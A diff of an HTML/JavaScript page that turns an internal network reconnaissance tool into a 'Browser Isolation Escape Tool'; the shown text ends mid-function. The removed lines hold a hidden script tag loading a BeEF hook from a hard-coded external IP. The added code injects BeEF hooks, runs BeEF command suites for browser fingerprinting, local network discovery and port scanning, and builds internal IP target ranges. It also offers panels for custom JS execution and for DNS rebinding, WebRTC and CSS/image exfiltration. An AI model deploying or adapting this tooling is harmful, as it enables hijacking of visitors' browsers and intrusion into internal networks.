@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🕵️ Internal Network Reconnaissance Tool</title>
-    <script src="http://34.67.77.15:8080/hook.js">
+    <title>🔓 Browser Isolation Escape Tool</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -16,16 +15,17 @@
         }
         
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
         }
         
         .header {
             text-align: center;
             margin-bottom: 30px;
-            border: 2px solid #00ff00;
+            border: 2px solid #ff0000;
             padding: 20px;
             border-radius: 8px;
+            background: #1a0000;
         }
         
         .section {
@@ -36,9 +36,10 @@
             border-radius: 8px;
         }
         
-        .critical { border-color: #ff0000; }
-        .warning { border-color: #ffaa00; }
-        .success { border-color: #00ff00; }
+        .critical { border-color: #ff0000; background: #1a0000; }
+        .warning { border-color: #ffaa00; background: #1a1500; }
+        .success { border-color: #00ff00; background: #001a00; }
+        .info { border-color: #4dabf7; background: #001a1a; }
         
         .input-section {
             background: #2a2a2a;
@@ -47,7 +48,7 @@
             margin: 15px 0;
         }
         
-        input[type="text"], textarea {
+        input[type="text"], input[type="file"], textarea, select {
             background: #1a1a1a;
             border: 2px solid #333;
             color: #00ff00;
@@ -93,6 +94,17 @@
             color: #fff;
         }
         
+        .warning-btn {
+            background: #5a4a1a;
+            border-color: #ffaa00;
+            color: #ffaa00;
+        }
+        
+        .warning-btn:hover {
+            background: #ffaa00;
+            color: #000;
+        }
+        
         .output {
             background: #000;
             border: 1px solid #333;
@@ -118,50 +130,6 @@
             gap: 20px;
         }
         
-        .target-item {
-            background: #2a2a2a;
-            border: 1px solid #444;
-            padding: 10px;
-            margin: 5px 0;
-            border-radius: 3px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .target-links {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        
-        .target-links a {
-            color: #4dabf7;
-            text-decoration: none;
-            padding: 3px 8px;
-            border: 1px solid #4dabf7;
-            border-radius: 3px;
-            font-size: 11px;
-        }
-        
-        .target-links a:hover {
-            background: #4dabf7;
-            color: #000;
-        }
-        
-        .status-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        
-        .status-unknown { background: #666; }
-        .status-success { background: #00ff00; }
-        .status-error { background: #ff6b6b; }
-        .status-warning { background: #ffaa00; }
-        
         .progress-bar {
             background: #333;
             border-radius: 10px;
@@ -171,7 +139,7 @@
         }
         
         .progress-fill {
-            background: linear-gradient(90deg, #00ff00, #4dabf7);
+            background: linear-gradient(90deg, #ff0000, #ffaa00);
             height: 100%;
             width: 0%;
             transition: width 0.3s;
@@ -193,159 +161,210 @@
         .stat-number {
             font-size: 24px;
             font-weight: bold;
-            color: #00ff00;
+            color: #ff6b6b;
         }
         
         .stat-label {
             font-size: 12px;
             color: #888;
         }
+        
+        .file-drop-zone {
+            border: 2px dashed #666;
+            padding: 30px;
+            text-align: center;
+            margin: 15px 0;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .file-drop-zone:hover,
+        .file-drop-zone.dragover {
+            border-color: #00ff00;
+            background: #002200;
+        }
+        
+        .target-list {
+            max-height: 200px;
+            overflow-y: auto;
+            background: #000;
+            border: 1px solid #333;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        
+        .target-item {
+            padding: 5px;
+            margin: 2px 0;
+            background: #1a1a1a;
+            border-radius: 3px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .status-good { color: #00ff00; }
+        .status-bad { color: #ff6b6b; }
+        .status-unknown { color: #888; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🕵️ Internal Network Reconnaissance Tool</h1>
-            <p>Dynamic target testing for internal network discovery and access validation</p>
+            <h1>🔓 Browser Isolation Escape Tool</h1>
+            <p>Advanced browser and network abuse testing for isolation environments</p>
             <div class="stats" id="stats">
                 <div class="stat-item">
-                    <div class="stat-number" id="total-targets">0</div>
-                    <div class="stat-label">Targets</div>
+                    <div class="stat-number" id="browser-tests">0</div>
+                    <div class="stat-label">Browser Tests</div>
                 </div>
                 <div class="stat-item">
-                    <div class="stat-number" id="accessible-targets">0</div>
-                    <div class="stat-label">Accessible</div>
+                    <div class="stat-number" id="network-targets">0</div>
+                    <div class="stat-label">Network Targets</div>
                 </div>
                 <div class="stat-item">
-                    <div class="stat-number" id="tests-run">0</div>
-                    <div class="stat-label">Tests Run</div>
+                    <div class="stat-number" id="successful-attacks">0</div>
+                    <div class="stat-label">Successful</div>
                 </div>
                 <div class="stat-item">
-                    <div class="stat-number" id="success-rate">0%</div>
-                    <div class="stat-label">Success Rate</div>
+                    <div class="stat-number" id="escape-attempts">0</div>
+                    <div class="stat-label">Escape Attempts</div>
                 </div>
             </div>
         </div>
 
-        <!-- Target Input Section -->
+        <!-- BeEF Integration -->
         <div class="section critical">
-            <h2>🎯 Target Configuration</h2>
+            <h2>🥩 BeEF Framework Integration</h2>
             <div class="input-section">
-                <label>Single Target:</label>
-                <input type="text" id="single-target" placeholder="192.168.1.100 or internal.company.com or 10.0.0.50:8080">
-                <button onclick="addSingleTarget()">Add Target</button>
-                <button onclick="addCommonPorts()">Add with Common Ports</button>
+                <label>BeEF Hook URL:</label>
+                <input type="text" id="beef-hook-url" placeholder="http://your-beef-server:3000/hook.js" style="width: 70%; display: inline-block;">
+                <button class="critical-btn" onclick="loadBeEFHook()" style="width: 25%; margin-left: 2%;">🪝 Hook Browser</button>
             </div>
-            
             <div class="input-section">
-                <label>Bulk Targets (one per line):</label>
-                <textarea id="bulk-targets" placeholder="192.168.1.100&#10;internal.company.com&#10;10.0.0.50:8080&#10;172.16.10.5:443&#10;app-server.internal:9000"></textarea>
-                <button onclick="addBulkTargets()">Add Bulk Targets</button>
-                <button onclick="generateIPRange()">Generate IP Range</button>
+                <label>BeEF Control Panel:</label>
+                <input type="text" id="beef-panel-url" placeholder="http://your-beef-server:3000/ui/panel" style="width: 70%; display: inline-block;">
+                <button onclick="openBeEFPanel()" style="width: 25%; margin-left: 2%;">🎛️ Open Panel</button>
             </div>
-
             <div class="input-section">
-                <label>IP Range Generator:</label>
-                <input type="text" id="ip-range" placeholder="192.168.1.1-254" style="width: 48%; display: inline-block;">
-                <input type="text" id="port-list" placeholder="80,443,8080,9000" style="width: 48%; display: inline-block; margin-left: 2%;">
-                <button onclick="generateRangeTargets()">Generate Range</button>
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                    <button class="warning-btn" onclick="testBeEFConnection()">Test Connection</button>
+                    <button class="critical-btn" onclick="executeBeEFCommands()">Execute Commands</button>
+                    <button onclick="unhookBeEF()">Unhook Browser</button>
+                    <button onclick="loadBeEFPayloads()">Load Payloads</button>
+                </div>
             </div>
+            <div id="beef-status" style="padding: 10px; margin: 10px 0; border: 1px solid #333; background: #000; border-radius: 3px; font-size: 12px;">
+                <span class="status-unknown">BeEF Status: Not Connected</span>
+            </div>
+            <div id="beef-output" class="output" style="max-height: 200px;"></div>
         </div>
 
         <!-- Target Management -->
-        <div class="section">
-            <h2>📋 Target Management</h2>
-            <div class="target-controls">
-                <button onclick="clearAllTargets()">Clear All</button>
-                <button onclick="exportTargets()">Export Results</button>
-                <button onclick="importTargets()">Import Targets</button>
-                <button class="critical-btn" onclick="runAllTests()">🚀 RUN ALL TESTS</button>
+        <div class="section critical">
+            <h2>🎯 Target Management</h2>
+            <div class="input-section">
+                <label>Upload Target List (CSV/TXT):</label>
+                <div class="file-drop-zone" id="file-drop-zone">
+                    <p>Drop target list here or click to browse</p>
+                    <input type="file" id="target-file" accept=".csv,.txt,.json" style="display: none;">
+                </div>
+                <button onclick="document.getElementById('target-file').click()">📁 Browse Files</button>
+                <button onclick="loadSampleTargets()">📋 Load Sample Targets</button>
+            </div>
+            
+            <div class="input-section">
+                <label>Manual Target Entry:</label>
+                <textarea id="manual-targets" placeholder="192.168.1.100&#10;internal.company.com:8080&#10;10.0.0.50:443&#10;172.16.10.5:9000"></textarea>
+                <button onclick="addManualTargets()">Add Targets</button>
+                <button onclick="generateLocalNetwork()">🌐 Generate Local Network Range</button>
+            </div>
+
+            <div class="target-list" id="target-list"></div>
+            
+            <div>
+                <button class="critical-btn" onclick="runAllTests()">🚀 RUN ALL ESCAPE TESTS</button>
+                <button onclick="clearTargets()">Clear Targets</button>
+                <button onclick="exportResults()">Export Results</button>
             </div>
             
             <div class="progress-bar">
                 <div class="progress-fill" id="progress-fill"></div>
             </div>
-            
-            <div id="target-list"></div>
         </div>
 
         <div class="grid">
-            <!-- Connectivity Testing -->
-            <div class="section">
-                <h2>🌐 Connectivity Testing</h2>
-                <button onclick="testBasicConnectivity()">Basic Connectivity</button>
-                <button onclick="testProtocolAccess()">Protocol Testing</button>
-                <button onclick="testPortScanning()">Port Scanning</button>
-                <button onclick="testResponseTiming()">Response Timing</button>
-                <div id="connectivity-output" class="output"></div>
+            <!-- Browser Abuse Testing -->
+            <div class="section critical">
+                <h2>🌐 Browser Abuse Testing</h2>
+                <button class="critical-btn" onclick="testExtensionAccess()">Extension Enumeration</button>
+                <button class="critical-btn" onclick="testConfigModification()">Config Modification</button>
+                <button class="warning-btn" onclick="testLocalFileAccess()">Local File Access</button>
+                <button class="warning-btn" onclick="testLocalStorage()">Local Storage Abuse</button>
+                <div id="browser-output" class="output"></div>
             </div>
 
-            <!-- HTTP/HTTPS Testing -->
-            <div class="section">
-                <h2>🔐 HTTP/HTTPS Testing</h2>
-                <button onclick="testHTTPAccess()">HTTP Access</button>
-                <button onclick="testHTTPSAccess()">HTTPS Access</button>
-                <button onclick="testHTTPMethods()">HTTP Methods</button>
-                <button onclick="testAuthenticationEndpoints()">Auth Endpoints</button>
-                <div id="http-output" class="output"></div>
-            </div>
-
-            <!-- Service Discovery -->
-            <div class="section">
-                <h2>🔍 Service Discovery</h2>
-                <button onclick="discoverServices()">Service Detection</button>
-                <button onclick="testCommonEndpoints()">Common Endpoints</button>
-                <button onclick="testAPIEndpoints()">API Discovery</button>
-                <button onclick="testAdminPanels()">Admin Panels</button>
-                <div id="discovery-output" class="output"></div>
-            </div>
-
-            <!-- Advanced Testing -->
+            <!-- Custom JavaScript Execution -->
             <div class="section warning">
-                <h2>⚡ Advanced Testing</h2>
-                <button onclick="testWebSocketConnections()">WebSocket Testing</button>
-                <button onclick="testCORSBypass()">CORS Testing</button>
-                <button onclick="testProxyBehavior()">Proxy Analysis</button>
-                <button onclick="testSSLCertificates()">SSL Certificate Info</button>
-                <div id="advanced-output" class="output"></div>
+                <h2>⚡ Custom JavaScript Execution</h2>
+                <div class="input-section">
+                    <textarea id="custom-js" placeholder="// Enter custom JavaScript for execution&#10;console.log('Escape attempt initiated');&#10;// Example: Access browser internals, modify DOM, etc."></textarea>
+                    <button class="critical-btn" onclick="executeCustomJS()">Execute Custom JS</button>
+                    <button onclick="loadJSPayloads()">Load Payload Library</button>
+                </div>
+                <div id="javascript-output" class="output"></div>
             </div>
 
-            <!-- Data Exfiltration Testing -->
+            <!-- Network Enumeration -->
+            <div class="section critical">
+                <h2>🕸️ Network Enumeration</h2>
+                <button class="critical-btn" onclick="enumerateLocalHosts()">Local Host Discovery</button>
+                <button class="critical-btn" onclick="testInternalAssets()">Test Internal Assets</button>
+                <button class="warning-btn" onclick="portScanTargets()">Port Scanning</button>
+                <button onclick="testNetworkProtocols()">Protocol Testing</button>
+                <div id="network-output" class="output"></div>
+            </div>
+
+            <!-- Advanced Escapes -->
+            <div class="section critical">
+                <h2>🔓 Advanced Escape Techniques</h2>
+                <button class="critical-btn" onclick="testWebRTCEscape()">WebRTC IP Disclosure</button>
+                <button class="critical-btn" onclick="testDNSRebinding()">DNS Rebinding</button>
+                <button class="warning-btn" onclick="testServiceWorkers()">Service Worker Abuse</button>
+                <button class="warning-btn" onclick="testWebSocketEscape()">WebSocket Tunneling</button>
+                <div id="escape-output" class="output"></div>
+            </div>
+
+            <!-- Data Exfiltration -->
             <div class="section critical">
                 <h2>📡 Data Exfiltration Testing</h2>
-                <button onclick="testDataUpload()">Upload Testing</button>
-                <button onclick="testDataDownload()">Download Testing</button>
-                <button onclick="testDNSExfiltration()">DNS Exfiltration</button>
-                <button class="critical-btn" onclick="establishBeacon()">Establish Beacon</button>
+                <button class="critical-btn" onclick="testImageExfiltration()">Image-based Exfil</button>
+                <button class="critical-btn" onclick="testCSSExfiltration()">CSS Data Exfil</button>
+                <button class="warning-btn" onclick="testTimingAttacks()">Timing Attacks</button>
+                <button onclick="establishCovertChannel()">Covert Channels</button>
                 <div id="exfiltration-output" class="output"></div>
             </div>
 
-            <!-- Link Generation -->
+            <!-- Results and Reporting -->
             <div class="section success">
-                <h2>🔗 Dynamic Link Generation</h2>
-                <button onclick="generateDirectLinks()">Generate Direct Links</button>
-                <button onclick="generateCommonPaths()">Common Paths</button>
-                <button onclick="generateAdminLinks()">Admin Links</button>
-                <button onclick="generateAPILinks()">API Links</button>
-                <div id="links-output" class="output"></div>
+                <h2>📊 Results Analysis</h2>
+                <button onclick="generateComprehensiveReport()">Generate Report</button>
+                <button onclick="analyzeSuccessfulEscapes()">Analyze Escapes</button>
+                <button onclick="exportTechnicalDetails()">Export Technical Details</button>
+                <div id="results-output" class="output"></div>
             </div>
-        </div>
-
-        <!-- Results Summary -->
-        <div class="section success">
-            <h2>📊 Comprehensive Results</h2>
-            <button onclick="generateReport()">Generate Report</button>
-            <button onclick="exportFindings()">Export Findings</button>
-            <button onclick="clearAllResults()">Clear Results</button>
-            <div id="results-output" class="output"></div>
         </div>
     </div>
 
     <script>
         let targets = [];
         let testResults = {};
-        let totalTests = 0;
-        let completedTests = 0;
+        let browserTestCount = 0;
+        let successfulAttacks = 0;
+        let escapeAttempts = 0;
+        let beefHooked = false;
+        let beefHookUrl = '';
+        let beefCommands = [];
 
         function log(section, message, type = 'info') {
             const output = document.getElementById(section + '-output');
@@ -355,584 +374,1694 @@
             output.innerHTML += `<span class="${type}">[${timestamp}] ${indicator} ${message}</span>\n`;
             output.scrollTop = output.scrollHeight;
             
-            // Store results
             if (!testResults[section]) testResults[section] = [];
-            testResults[section].push({timestamp, message, type, target: getCurrentTarget()});
-        }
-
-        function getCurrentTarget() {
-            return window.currentTarget || 'general';
+            testResults[section].push({timestamp, message, type});
         }
 
         function updateStats() {
-            document.getElementById('total-targets').textContent = targets.length;
-            document.getElementById('tests-run').textContent = completedTests;
+            document.getElementById('browser-tests').textContent = browserTestCount;
+            document.getElementById('network-targets').textContent = targets.length;
+            document.getElementById('successful-attacks').textContent = successfulAttacks;
+            document.getElementById('escape-attempts').textContent = escapeAttempts;
             
-            const accessible = targets.filter(t => t.status === 'accessible').length;
-            document.getElementById('accessible-targets').textContent = accessible;
-            
-            const successRate = totalTests > 0 ? Math.round((accessible / targets.length) * 100) : 0;
-            document.getElementById('success-rate').textContent = successRate + '%';
-        }
-
-        function updateProgress() {
-            if (totalTests > 0) {
-                const progress = (completedTests / totalTests) * 100;
-                document.getElementById('progress-fill').style.width = progress + '%';
+            // Update BeEF status
+            const beefStatus = document.getElementById('beef-status');
+            if (beefHooked) {
+                beefStatus.innerHTML = '<span class="status-good">🥩 BeEF Status: Connected & Hooked</span>';
+            } else {
+                beefStatus.innerHTML = '<span class="status-unknown">BeEF Status: Not Connected</span>';
             }
         }
 
-        // Target Management Functions
-        function addSingleTarget() {
-            const target = document.getElementById('single-target').value.trim();
-            if (target && !targets.find(t => t.url === target)) {
-                targets.push({
-                    url: target,
-                    status: 'unknown',
-                    results: {},
-                    addedAt: new Date().toISOString()
-                });
-                document.getElementById('single-target').value = '';
-                updateTargetList();
-                updateStats();
-                log('results', `Target added: ${target}`, 'success');
-            }
+        function updateProgress(current, total) {
+            const progress = (current / total) * 100;
+            document.getElementById('progress-fill').style.width = progress + '%';
         }
 
-        function addCommonPorts() {
-            const baseTarget = document.getElementById('single-target').value.trim();
-            if (!baseTarget) return;
+        // File handling
+        document.getElementById('target-file').addEventListener('change', handleFileUpload);
+        
+        function handleFileUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
             
-            const commonPorts = [80, 443, 8080, 8443, 9000, 3000, 5000, 8000, 8081, 9090];
-            const host = baseTarget.split(':')[0];
-            
-            commonPorts.forEach(port => {
-                const target = `${host}:${port}`;
-                if (!targets.find(t => t.url === target)) {
-                    targets.push({
-                        url: target,
-                        status: 'unknown',
-                        results: {},
-                        addedAt: new Date().toISOString()
-                    });
-                }
-            });
-            
-            document.getElementById('single-target').value = '';
-            updateTargetList();
-            updateStats();
-            log('results', `Added ${commonPorts.length} port variants for ${host}`, 'success');
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const content = e.target.result;
+                parseTargetFile(content, file.name);
+            };
+            reader.readAsText(file);
         }
 
-        function addBulkTargets() {
-            const bulkText = document.getElementById('bulk-targets').value;
-            const newTargets = bulkText.split('\n')
-                .map(t => t.trim())
-                .filter(t => t && !targets.find(existing => existing.url === t));
+        function parseTargetFile(content, filename) {
+            const lines = content.split('\n').map(line => line.trim()).filter(line => line);
+            let newTargets = [];
             
-            newTargets.forEach(target => {
-                targets.push({
-                    url: target,
-                    status: 'unknown',
-                    results: {},
-                    addedAt: new Date().toISOString()
-                });
-            });
-            
-            document.getElementById('bulk-targets').value = '';
-            updateTargetList();
-            updateStats();
-            log('results', `Added ${newTargets.length} bulk targets`, 'success');
-        }
-
-        function generateRangeTargets() {
-            const range = document.getElementById('ip-range').value.trim();
-            const ports = document.getElementById('port-list').value.trim();
-            
-            if (!range) return;
-            
-            const portList = ports ? ports.split(',').map(p => p.trim()) : [''];
-            const [baseIP, rangeEnd] = range.split('-');
-            
-            if (!baseIP || !rangeEnd) {
-                log('results', 'Invalid IP range format. Use: 192.168.1.1-254', 'error');
-                return;
-            }
-            
-            const ipParts = baseIP.split('.');
-            if (ipParts.length !== 4) {
-                log('results', 'Invalid IP format', 'error');
-                return;
-            }
-            
-            const baseNetwork = ipParts.slice(0, 3).join('.');
-            const startHost = parseInt(ipParts[3]);
-            const endHost = parseInt(rangeEnd);
-            
-            let addedCount = 0;
-            for (let host = startHost; host <= endHost; host++) {
-                const ip = `${baseNetwork}.${host}`;
-                
-                portList.forEach(port => {
-                    const target = port ? `${ip}:${port}` : ip;
-                    if (!targets.find(t => t.url === target)) {
-                        targets.push({
-                            url: target,
-                            status: 'unknown',
-                            results: {},
-                            addedAt: new Date().toISOString()
+            if (filename.endsWith('.csv')) {
+                // Parse CSV format
+                lines.forEach(line => {
+                    const parts = line.split(',');
+                    if (parts.length >= 1) {
+                        newTargets.push({
+                            host: parts[0].trim(),
+                            port: parts[1] ? parts[1].trim() : '',
+                            service: parts[2] ? parts[2].trim() : 'unknown',
+                            status: 'unknown'
                         });
-                        addedCount++;
+                    }
+                });
+            } else {
+                // Parse as plain text
+                lines.forEach(line => {
+                    if (line.includes(':')) {
+                        const [host, port] = line.split(':');
+                        newTargets.push({
+                            host: host.trim(),
+                            port: port.trim(),
+                            service: 'unknown',
+                            status: 'unknown'
+                        });
+                    } else {
+                        newTargets.push({
+                            host: line.trim(),
+                            port: '',
+                            service: 'unknown',
+                            status: 'unknown'
+                        });
                     }
                 });
             }
             
+            targets = targets.concat(newTargets);
             updateTargetList();
             updateStats();
-            log('results', `Generated ${addedCount} targets from IP range`, 'success');
+            log('results', `Loaded ${newTargets.length} targets from ${filename}`, 'success');
+        }
+
+        function addManualTargets() {
+            const manualText = document.getElementById('manual-targets').value;
+            const lines = manualText.split('\n').map(line => line.trim()).filter(line => line);
+            
+            lines.forEach(line => {
+                if (line.includes(':')) {
+                    const [host, port] = line.split(':');
+                    targets.push({
+                        host: host.trim(),
+                        port: port.trim(),
+                        service: 'manual',
+                        status: 'unknown'
+                    });
+                } else {
+                    targets.push({
+                        host: line.trim(),
+                        port: '',
+                        service: 'manual',
+                        status: 'unknown'
+                    });
+                }
+            });
+            
+            document.getElementById('manual-targets').value = '';
+            updateTargetList();
+            updateStats();
+            log('results', `Added ${lines.length} manual targets`, 'success');
+        }
+
+        function generateLocalNetwork() {
+            const commonNetworks = [
+                '192.168.1.1-255',
+                '192.168.0.1-255',
+                '10.0.0.1-255',
+                '172.16.0.1-255',
+                '192.168.100.1-255'
+            ];
+            
+            const commonPorts = ['80', '443', '8080', '8443', '9000', '3000', '5000'];
+            
+            commonNetworks.forEach(network => {
+                const [baseIP, range] = network.split('-');
+                const ipParts = baseIP.split('.');
+                const baseNetwork = ipParts.slice(0, 3).join('.');
+                const endHost = parseInt(range);
+                
+                for (let host = 1; host <= Math.min(endHost, 50); host++) { // Limit to first 50 IPs
+                    const ip = `${baseNetwork}.${host}`;
+                    
+                    // Add without port
+                    targets.push({
+                        host: ip,
+                        port: '',
+                        service: 'auto-generated',
+                        status: 'unknown'
+                    });
+                    
+                    // Add with common ports
+                    commonPorts.forEach(port => {
+                        targets.push({
+                            host: ip,
+                            port: port,
+                            service: 'auto-generated',
+                            status: 'unknown'
+                        });
+                    });
+                }
+            });
+            
+            updateTargetList();
+            updateStats();
+            log('results', `Generated ${targets.length} local network targets`, 'success');
+        }
+
+        function loadSampleTargets() {
+            const sampleTargets = [
+                { host: '192.168.1.1', port: '80', service: 'router', status: 'unknown' },
+                { host: '192.168.1.1', port: '443', service: 'router-ssl', status: 'unknown' },
+                { host: '10.0.0.1', port: '8080', service: 'admin', status: 'unknown' },
+                { host: 'internal.company.com', port: '443', service: 'intranet', status: 'unknown' },
+                { host: 'mail.internal', port: '443', service: 'mail', status: 'unknown' },
+                { host: '172.16.10.5', port: '9000', service: 'app-server', status: 'unknown' },
+                { host: 'jenkins.internal', port: '8080', service: 'ci-cd', status: 'unknown' },
+                { host: 'grafana.internal', port: '3000', service: 'monitoring', status: 'unknown' }
+            ];
+            
+            targets = targets.concat(sampleTargets);
+            updateTargetList();
+            updateStats();
+            log('results', 'Loaded sample internal targets', 'success');
         }
 
         function updateTargetList() {
             const listContainer = document.getElementById('target-list');
             listContainer.innerHTML = '';
             
-            targets.forEach((target, index) => {
+            targets.slice(0, 20).forEach((target, index) => { // Show first 20
                 const item = document.createElement('div');
                 item.className = 'target-item';
                 
-                const statusClass = target.status === 'accessible' ? 'status-success' : 
-                                  target.status === 'blocked' ? 'status-error' : 
-                                  target.status === 'partial' ? 'status-warning' : 'status-unknown';
+                const statusClass = target.status === 'accessible' ? 'status-good' : 
+                                  target.status === 'blocked' ? 'status-bad' : 'status-unknown';
+                
+                const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
                 
                 item.innerHTML = `
-                    <div>
-                        <span class="status-indicator ${statusClass}"></span>
-                        <strong>${target.url}</strong>
-                        <small style="color: #888; margin-left: 10px;">${target.status}</small>
-                    </div>
-                    <div class="target-links">
-                        <a href="http://${target.url}" target="_blank">HTTP</a>
-                        <a href="https://${target.url}" target="_blank">HTTPS</a>
-                        <button onclick="testSingleTarget(${index})" style="font-size: 10px; padding: 2px 6px;">Test</button>
-                        <button onclick="removeTarget(${index})" style="font-size: 10px; padding: 2px 6px; background: #5a1a1a;">Remove</button>
-                    </div>
+                    <span class="${statusClass}">${fullTarget} (${target.service})</span>
+                    <span class="${statusClass}">${target.status}</span>
                 `;
                 
                 listContainer.appendChild(item);
             });
+            
+            if (targets.length > 20) {
+                const moreItem = document.createElement('div');
+                moreItem.className = 'target-item';
+                moreItem.innerHTML = `<span class="status-unknown">... and ${targets.length - 20} more targets</span>`;
+                listContainer.appendChild(moreItem);
+            }
         }
 
-        function removeTarget(index) {
-            targets.splice(index, 1);
-            updateTargetList();
-            updateStats();
-        }
-
-        function clearAllTargets() {
+        function clearTargets() {
             targets = [];
-            testResults = {};
             updateTargetList();
             updateStats();
             log('results', 'All targets cleared', 'warning');
         }
 
-        // Testing Functions
-        async function testBasicConnectivity() {
-            log('connectivity', 'Starting basic connectivity tests...', 'info');
+        // BeEF Framework Integration Functions
+        function loadBeEFHook() {
+            const hookUrl = document.getElementById('beef-hook-url').value.trim();
             
-            for (const target of targets) {
-                window.currentTarget = target.url;
-                
-                try {
-                    // Test basic HTTP connectivity
-                    const startTime = Date.now();
-                    const response = await fetch(`http://${target.url}`, {
-                        method: 'HEAD',
-                        mode: 'no-cors',
-                        signal: AbortSignal.timeout(5000)
-                    });
-                    const responseTime = Date.now() - startTime;
-                    
-                    target.results.connectivity = {
-                        accessible: true,
-                        responseTime: responseTime,
-                        method: 'HTTP'
-                    };
-                    
-                    if (target.status === 'unknown') target.status = 'accessible';
-                    log('connectivity', `✅ ${target.url} - Accessible (${responseTime}ms)`, 'success');
-                    
-                } catch (error) {
-                    // Try HTTPS
-                    try {
-                        const startTime = Date.now();
-                        const response = await fetch(`https://${target.url}`, {
-                            method: 'HEAD',
-                            mode: 'no-cors',
-                            signal: AbortSignal.timeout(5000)
-                        });
-                        const responseTime = Date.now() - startTime;
-                        
-                        target.results.connectivity = {
-                            accessible: true,
-                            responseTime: responseTime,
-                            method: 'HTTPS'
-                        };
-                        
-                        if (target.status === 'unknown') target.status = 'accessible';
-                        log('connectivity', `✅ ${target.url} - Accessible via HTTPS (${responseTime}ms)`, 'success');
-                        
-                    } catch (httpsError) {
-                        target.results.connectivity = {
-                            accessible: false,
-                            error: error.message
-                        };
-                        
-                        if (target.status === 'unknown') target.status = 'blocked';
-                        log('connectivity', `❌ ${target.url} - Not accessible: ${error.message}`, 'error');
-                    }
+            if (!hookUrl) {
+                log('beef', 'Please enter a BeEF hook URL', 'error');
+                return;
+            }
+            
+            if (beefHooked) {
+                log('beef', 'Browser is already hooked to BeEF', 'warning');
+                return;
+            }
+            
+            log('beef', `🪝 Attempting to load BeEF hook from: ${hookUrl}`, 'critical');
+            
+            try {
+                // Remove existing BeEF script if present
+                const existingScript = document.getElementById('beef-hook-script');
+                if (existingScript) {
+                    existingScript.remove();
                 }
                 
-                completedTests++;
-                updateProgress();
+                // Create and inject BeEF hook script
+                const script = document.createElement('script');
+                script.id = 'beef-hook-script';
+                script.src = hookUrl;
+                script.type = 'text/javascript';
+                
+                script.onload = function() {
+                    beefHooked = true;
+                    beefHookUrl = hookUrl;
+                    log('beef', '🚨 BeEF hook loaded successfully! Browser is now hooked.', 'critical');
+                    log('beef', 'BeEF commands can now be executed from the control panel', 'success');
+                    successfulAttacks++;
+                    updateStats();
+                    
+                    // Test if BeEF object is available
+                    setTimeout(() => {
+                        if (typeof beef !== 'undefined') {
+                            log('beef', '✅ BeEF object detected in global scope', 'success');
+                            log('beef', `BeEF Session: ${beef.session ? beef.session.get_hook_session_id() : 'Unknown'}`, 'info');
+                        }
+                    }, 1000);
+                };
+                
+                script.onerror = function() {
+                    log('beef', '❌ Failed to load BeEF hook script', 'error');
+                    log('beef', 'Check if BeEF server is running and URL is correct', 'warning');
+                };
+                
+                document.head.appendChild(script);
+                
+            } catch (error) {
+                log('beef', `BeEF hook loading error: ${error.message}`, 'error');
+            }
+        }
+        
+        function testBeEFConnection() {
+            const hookUrl = document.getElementById('beef-hook-url').value.trim();
+            
+            if (!hookUrl) {
+                log('beef', 'Please enter a BeEF hook URL first', 'error');
+                return;
+            }
+            
+            log('beef', '🔍 Testing BeEF server connection...', 'info');
+            
+            // Test connection to BeEF server
+            fetch(hookUrl, {
+                method: 'HEAD',
+                mode: 'no-cors',
+                signal: AbortSignal.timeout(5000)
+            })
+            .then(() => {
+                log('beef', '✅ BeEF server is reachable', 'success');
+            })
+            .catch(error => {
+                log('beef', `❌ BeEF server connection failed: ${error.message}`, 'error');
+                log('beef', 'Ensure BeEF is running and accessible from this network', 'warning');
+            });
+            
+            // If already hooked, test BeEF functionality
+            if (beefHooked && typeof beef !== 'undefined') {
+                try {
+                    log('beef', '🧪 Testing BeEF functionality...', 'info');
+                    
+                    // Test basic BeEF functions
+                    if (beef.browser) {
+                        log('beef', `Browser: ${beef.browser.getBrowserName()} ${beef.browser.getBrowserVersion()}`, 'info');
+                    }
+                    
+                    if (beef.net) {
+                        log('beef', '✅ BeEF network functions available', 'success');
+                    }
+                    
+                    if (beef.dom) {
+                        log('beef', '✅ BeEF DOM functions available', 'success');
+                    }
+                    
+                    log('beef', '✅ BeEF is fully functional', 'success');
+                    
+                } catch (error) {
+                    log('beef', `BeEF functionality test failed: ${error.message}`, 'error');
+                }
+            }
+        }
+        
+        function executeBeEFCommands() {
+            if (!beefHooked) {
+                log('beef', 'Browser must be hooked to BeEF first', 'error');
+                return;
+            }
+            
+            log('beef', '⚡ Executing BeEF command suite...', 'critical');
+            escapeAttempts++;
+            
+            // Execute common BeEF commands for browser isolation testing
+            const commands = [
+                {
+                    name: 'Get Browser Information',
+                    exec: () => {
+                        if (typeof beef !== 'undefined' && beef.browser) {
+                            const info = {
+                                name: beef.browser.getBrowserName(),
+                                version: beef.browser.getBrowserVersion(),
+                                platform: beef.browser.getBrowserPlatform(),
+                                plugins: beef.browser.getPlugins(),
+                            };
+                            log('beef', `Browser Info: ${JSON.stringify(info, null, 2)}`, 'info');
+                            return true;
+                        }
+                        return false;
+                    }
+                },
+                {
+                    name: 'Network Discovery',
+                    exec: () => {
+                        if (typeof beef !== 'undefined' && beef.net) {
+                            try {
+                                // BeEF network discovery
+                                beef.net.local_network_discovery();
+                                log('beef', '🌐 Network discovery initiated via BeEF', 'success');
+                                return true;
+                            } catch (error) {
+                                log('beef', `Network discovery failed: ${error.message}`, 'error');
+                                return false;
+                            }
+                        }
+                        return false;
+                    }
+                },
+                {
+                    name: 'Port Scanning',
+                    exec: () => {
+                        if (typeof beef !== 'undefined' && beef.net) {
+                            try {
+                                const targets = ['127.0.0.1', '192.168.1.1', '10.0.0.1'];
